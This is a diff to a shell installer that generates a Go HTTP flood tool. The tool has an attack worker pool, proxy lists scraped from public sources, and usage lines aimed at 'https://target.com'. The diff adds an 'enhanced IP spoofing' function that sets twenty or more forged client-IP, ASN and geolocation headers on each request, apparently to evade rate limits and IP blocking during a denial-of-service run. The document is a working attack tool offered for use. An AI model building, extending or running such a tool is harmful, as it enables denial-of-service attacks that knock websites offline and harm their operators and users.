@@ -24,7 +24,7 @@ echo -e "${CYAN}${SEP}${NC}"
 echo
 
 # Create main.go file directly
-echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go with multiple proxy sources...${NC}"
+echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go with enhanced IP spoofing...${NC}"
 
 cat > main.go << 'EOF'
 package main
@@ -93,154 +93,43 @@ var (
 		"https://raw.githubusercontent.com/ALIILAPRO/proxy-list/main/http.txt",
 	}
 
+	// IP spoofing headers (complete list)
+	ipSpoofingHeaders = []string{
+		"X-Forwarded-For",
+		"X-Real-IP",
+		"X-Originating-IP",
+		"X-Remote-IP",
+		"X-Remote-Addr",
+		"X-Client-IP",
+		"X-Host",
+		"X-Forwarded-Host",
+		"X-Forwarded-Server",
+		"CF-Connecting-IP",
+		"True-Client-IP",
+		"X-Proxy-IP",
+		"X-Original-Forwarded-For",
+		"Forwarded",
+		"X-Forwarded",
+		"X-Forwarded-For-Original",
+		"X-Cluster-Client-IP",
+		"X-Proxy-ID",
+		"X-Real-IP-Original",
+		"X-Custom-IP",
+	}
+
+	// Real ASN ranges for more believable spoofing
+	asnPrefixes = []string{
+		"AS15169", "AS16509", "AS14618", "AS8075", "AS32934", // Google, AWS, Microsoft, Facebook
+		"AS13335", "AS54113", "AS26496", "AS46606", "AS36352", // Cloudflare, Fastly
+		"AS14061", "AS16276", "AS20473", "AS63949", "AS24940", // DigitalOcean, OVH, Vultr, Hetzner
+	}
+
 	acceptLanguages = []string{
 		"en-US,en;q=0.9",
 		"en-US,en;q=0.9,fr;q=0.8,de;q=0.7,es;q=0.6,ja;q=0.5,zh-CN;q=0.4",
 		"en-GB,en;q=0.9,en-US;q=0.8",
 		"en-US,en;q=0.9,es;q=0.8,pt;q=0.7",
 		"en-US,en;q=0.9,ru;q=0.8,uk;q=0.7",
-		"en-US,en;q=0.9,nl;q=0.8,zh-CN;q=0.7,zh;q=0.6,pt-BR;q=0.5,pt;q=0.4,lv;q=0.3,ja;q=0.2,id;q=0.1,es;q=0.1,th;q=0.1,hu;q=0.1,da;q=0.1,fr;q=0.1,tr;q=0.1,it;q=0.1,ms;q=0.1,hi;q=0.1,zh-TW;q=0.1,ru;q=0.1,uk;q=0.1,sv;q=0.1,ko;q=0.1",
-		"en-US,en;q=0.5",
-		"en-US;q=0.8,en;q=0.7",
-		"en-GB,en;q=0.9",
-		"en-CA,en;q=0.9",
-		"en-AU,en;q=0.9",
-		"en-NZ,en;q=0.9",
-		"en-ZA,en;q=0.9",
-		"en-IE,en;q=0.9",
-		"en-IN,en;q=0.9",
-		"ar-SA,ar;q=0.9",
-		"az-Latn-AZ,az;q=0.9",
-		"be-BY,be;q=0.9",
-		"bg-BG,bg;q=0.9",
-		"bn-IN,bn;q=0.9",
-		"ca-ES,ca;q=0.9",
-		"cs-CZ,cs;q=0.9",
-		"cy-GB,cy;q=0.9",
-		"da-DK,da;q=0.9",
-		"de-DE,de;q=0.9",
-		"el-GR,el;q=0.9",
-		"es-ES,es;q=0.9",
-		"et-EE,et;q=0.9",
-		"eu-ES,eu;q=0.9",
-		"fa-IR,fa;q=0.9",
-		"fi-FI,fi;q=0.9",
-		"fr-FR,fr;q=0.9",
-		"ga-IE,ga;q=0.9",
-		"gl-ES,gl;q=0.9",
-		"gu-IN,gu;q=0.9",
-		"he-IL,he;q=0.9",
-		"hi-IN,hi;q=0.9",
-		"hr-HR,hr;q=0.9",
-		"hu-HU,hu;q=0.9",
-		"hy-AM,hy;q=0.9",
-		"id-ID,id;q=0.9",
-		"is-IS,is;q=0.9",
-		"it-IT,it;q=0.9",
-		"ja-JP,ja;q=0.9",
-		"ka-GE,ka;q=0.9",
-		"kk-KZ,kk;q=0.9",
-		"km-KH,km;q=0.9",
-		"kn-IN,kn;q=0.9",
-		"ko-KR,ko;q=0.9",
-		"ky-KG,ky;q=0.9",
-		"lo-LA,lo;q=0.9",
-		"lt-LT,lt;q=0.9",
-		"lv-LV,lv;q=0.9",
-		"mk-MK,mk;q=0.9",
-		"ml-IN,ml;q=0.9",
-		"mn-MN,mn;q=0.9",
-		"mr-IN,mr;q=0.9",
-		"ms-MY,ms;q=0.9",
-		"mt-MT,mt;q=0.9",
-		"my-MM,my;q=0.9",
-		"nb-NO,nb;q=0.9",
-		"ne-NP,ne;q=0.9",
-		"nl-NL,nl;q=0.9",
-		"nn-NO,nn;q=0.9",
-		"or-IN,or;q=0.9",
-		"pa-IN,pa;q=0.9",
-		"pl-PL,pl;q=0.9",
-		"pt-BR,pt;q=0.9",
-		"pt-PT,pt;q=0.9",
-		"ro-RO,ro;q=0.9",
-		"ru-RU,ru;q=0.9",
-		"si-LK,si;q=0.9",
-		"sk-SK,sk;q=0.9",
-		"sl-SI,sl;q=0.9",
-		"sq-AL,sq;q=0.9",
-		"sr-Cyrl-RS,sr;q=0.9",
-		"sr-Latn-RS,sr;q=0.9",
-		"sv-SE,sv;q=0.9",
-		"sw-KE,sw;q=0.9",
-		"ta-IN,ta;q=0.9",
-		"te-IN,te;q=0.9",
-		"th-TH,th;q=0.9",
-		"tr-TR,tr;q=0.9",
-		"uk-UA,uk;q=0.9",
-		"ur-PK,ur;q=0.9",
-		"uz-Latn-UZ,uz;q=0.9",
-		"vi-VN,vi;q=0.9",
-		"zh-CN,zh;q=0.9",
-		"zh-HK,zh;q=0.9",
-		"zh-TW,zh;q=0.9",
-		"am-ET,am;q=0.8",
-		"as-IN,as;q=0.8",
-		"az-Cyrl-AZ,az;q=0.8",
-		"bn-BD,bn;q=0.8",
-		"bs-Cyrl-BA,bs;q=0.8",
-		"bs-Latn-BA,bs;q=0.8",
-		"dz-BT,dz;q=0.8",
-		"fil-PH,fil;q=0.8",
-		"fr-CA,fr;q=0.8",
-		"fr-CH,fr;q=0.8",
-		"fr-BE,fr;q=0.8",
-		"fr-LU,fr;q=0.8",
-		"gsw-CH,gsw;q=0.8",
-		"ha-Latn-NG,ha;q=0.8",
-		"hr-BA,hr;q=0.8",
-		"ig-NG,ig;q=0.8",
-		"ii-CN,ii;q=0.8",
-		"jv-Latn-ID,jv;q=0.8",
-		"kkj-CM,kkj;q=0.8",
-		"kl-GL,kl;q=0.8",
-		"kok-IN,kok;q=0.8",
-		"ks-Arab-IN,ks;q=0.8",
-		"lb-LU,lb;q=0.8",
-		"ln-CG,ln;q=0.8",
-		"mn-Mong-CN,mn;q=0.8",
-		"mr-MN,mr;q=0.8",
-		"ms-BN,ms;q=0.8",
-		"mua-CM,mua;q=0.8",
-		"nds-DE,nds;q=0.8",
-		"ne-IN,ne;q=0.8",
-		"nso-ZA,nso;q=0.8",
-		"oc-FR,oc;q=0.8",
-		"pa-Arab-PK,pa;q=0.8",
-		"ps-AF,ps;q=0.8",
-		"quz-BO,quz;q=0.8",
-		"quz-EC,quz;q=0.8",
-		"quz-PE,quz;q=0.8",
-		"rm-CH,rm;q=0.8",
-		"rw-RW,rw;q=0.8",
-		"sd-Arab-PK,sd;q=0.8",
-		"se-NO,se;q=0.8",
-		"smn-FI,smn;q=0.8",
-		"sms-FI,sms;q=0.8",
-		"syr-SY,syr;q=0.8",
-		"tg-Cyrl-TJ,tg;q=0.8",
-		"ti-ER,ti;q=0.8",
-		"tk-TM,tk;q=0.8",
-		"tn-ZA,tn;q=0.8",
-		"tt-RU,tt;q=0.8",
-		"ug-CN,ug;q=0.8",
-		"uz-Cyrl-UZ,uz;q=0.8",
-		"ve-ZA,ve;q=0.8",
-		"wo-SN,wo;q=0.8",
-		"xh-ZA,xh;q=0.8",
-		"yo-NG,yo;q=0.8",
-		"zgh-MA,zgh;q=0.8",
-		"zu-ZA,zu;q=0.8",
 	}
 
 	acceptHeaders = []string{
@@ -492,7 +381,6 @@ func loadProxiesFromMultipleSources() {
 		for scanner.Scan() {
 			line := strings.TrimSpace(scanner.Text())
 			if line != "" && strings.Contains(line, ":") && !strings.HasPrefix(line, "#") {
-				// Basic validation - check if it has port number
 				parts := strings.Split(line, ":")
 				if len(parts) >= 2 {
 					if _, err := strconv.Atoi(parts[1]); err == nil {
@@ -507,10 +395,9 @@ func loadProxiesFromMultipleSources() {
 			fmt.Printf("[+] Source %d/%d: Loaded %d proxies\n", i+1, len(proxySources), count)
 		}
 		
-		time.Sleep(500 * time.Millisecond) // Be respectful to APIs
+		time.Sleep(500 * time.Millisecond)
 	}
 	
-	// Remove duplicates
 	uniqueProxies := make(map[string]bool)
 	var cleanProxies []string
 	for _, proxy := range allProxies {
@@ -573,12 +460,109 @@ func printBanner() {
 	fmt.Println("\033[0m")
 }
 
+// Enhanced IP spoofing functions
 func randomIP() string {
 	return fmt.Sprintf("%d.%d.%d.%d", randInt(1, 255), randInt(1, 255), randInt(1, 255), randInt(1, 255))
 }
 
+func randomIPv6() string {
+	parts := make([]string, 8)
+	for i := range parts {
+		parts[i] = fmt.Sprintf("%x", randInt(0, 65535))
+	}
+	return strings.Join(parts, ":")
+}
+
+func randomCIDR() string {
+	cidr := randInt(8, 32)
+	ip := randomIP()
+	return fmt.Sprintf("%s/%d", ip, cidr)
+}
+
+func randomIPRange() string {
+	ip1 := randomIP()
+	ip2 := randomIP()
+	return fmt.Sprintf("%s-%s", ip1, ip2)
+}
+
+func randomASN() string {
+	return asnPrefixes[randInt(0, len(asnPrefixes)-1)]
+}
+
 func randomCountryCode() string {
 	return countryCodes[randInt(0, len(countryCodes)-1)]
+}
+
+// Generate a chain of proxy IPs
+func generateProxyChain() string {
+	numProxies := randInt(1, 4)
+	chain := make([]string, numProxies)
+	for i := range chain {
+		chain[i] = randomIP()
+	}
+	return strings.Join(chain, ", ")
+}
+
+// Generate all spoofed headers at once
+func addSpoofedHeaders(req *http.Request) {
+	// Random IP for this request
+	spoofedIP := randomIP()
+	
+	// Always add core headers
+	req.Header.Set("X-Forwarded-For", spoofedIP)
+	req.Header.Set("X-Real-IP", spoofedIP)
+	
+	// Add 3-7 random spoofing headers
+	numHeaders := randInt(3, 8)
+	selectedHeaders := make(map[string]bool)
+	
+	for i := 0; i < numHeaders; i++ {
+		headerName := ipSpoofingHeaders[randInt(0, len(ipSpoofingHeaders)-1)]
+		if selectedHeaders[headerName] {
+			continue
+		}
+		selectedHeaders[headerName] = true
+		
+		// Different value types for different headers
+		switch headerName {
+		case "Forwarded":
+			req.Header.Set(headerName, fmt.Sprintf("for=%s; proto=http; by=%s", spoofedIP, randomASN()))
+		case "X-Forwarded-For-Original", "X-Cluster-Client-IP":
+			req.Header.Set(headerName, generateProxyChain())
+		default:
+			req.Header.Set(headerName, spoofedIP)
+		}
+	}
+	
+	// Sometimes add IPv6 spoofing (10% chance)
+	if randInt(1, 100) <= 10 {
+		req.Header.Set("X-Forwarded-For-V6", randomIPv6())
+	}
+	
+	// Sometimes add CIDR range (15% chance)
+	if randInt(1, 100) <= 15 {
+		req.Header.Set("X-Forwarded-Range", randomCIDR())
+	}
+	
+	// Add ASN info (20% chance)
+	if randInt(1, 100) <= 20 {
+		req.Header.Set("X-ASN", randomASN())
+		req.Header.Set("X-Network-Name", fmt.Sprintf("AS%s Network", randomASN()))
+	}
+	
+	// Add geo-location spoofing (25% chance)
+	if randInt(1, 100) <= 25 {
+		country := randomCountryCode()
+		req.Header.Set("X-Geo-Country", country)
+		req.Header.Set("X-Country-Code", country)
+		req.Header.Set("CF-IPCountry", country)
+	}
+	
+	// Add X-Forwarded-For with multiple hops (30% chance)
+	if randInt(1, 100) <= 30 {
+		multiHop := fmt.Sprintf("%s, %s, %s", randomIP(), randomIP(), spoofedIP)
+		req.Header.Set("X-Forwarded-For", multiHop)
+	}
 }
 
 func generateRandomUA() string {
@@ -827,6 +811,7 @@ func main() {
 	if useProxy && len(proxies) > 0 {
 		fmt.Printf("[+] Proxies: %d\n", len(proxies))
 	}
+	fmt.Println("[+] IP Spoofing: ENABLED (20+ headers)")
 	fmt.Println("[+] Starting... Press Ctrl+C to stop")
 
 	poolSize := 500
@@ -963,12 +948,8 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 			req.Header.Set("Cache-Control", cacheControls[randInt(0, len(cacheControls)-1)])
 			req.Header.Set("Connection", "keep-alive")
 
-			randomSpoofIP := randomIP()
-			req.Header.Set("X-Forwarded-For", randomSpoofIP)
-			req.Header.Set("X-Real-IP", randomSpoofIP)
-			req.Header.Set("CF-Connecting-IP", randomSpoofIP)
-			req.Header.Set("X-Forwarded", randomSpoofIP)
-			req.Header.Set("Forwarded-For", randomSpoofIP)
+			// ENHANCED IP SPOOFING - Add all spoofed headers
+			addSpoofedHeaders(req)
 
 			numSecurity := randInt(1, 2)
 			for i := 0; i < numSecurity; i++ {
@@ -1024,7 +1005,7 @@ if [ ! -f "main.go" ]; then
     echo -e " ${RED}✗ Error: Failed to create main.go${NC}"
     exit 1
 else
-    echo -e " ${GREEN}✓ main.go created successfully (16 proxy sources)${NC}"
+    echo -e " ${GREEN}✓ main.go created successfully (Enhanced IP Spoofing)${NC}"
 fi
 
 echo
@@ -1136,7 +1117,8 @@ if [ $? -eq 0 ]; then
     echo -e "   ${YELLOW}./main https://target.com 60 SLOW${NC}"
     echo -e "   ${YELLOW}./main https://target.com 60 GET proxy${NC}"
     echo
-    echo -e " ${CYAN}►${NC} Proxy mode will load from ${YELLOW}16 different sources${NC}"
+    echo -e " ${CYAN}►${NC} Enhanced IP Spoofing: ${YELLOW}20+ headers${NC}"
+    echo -e " ${CYAN}►${NC} Proxy mode loads from ${YELLOW}16 different sources${NC}"
     echo
     exit 0
 else
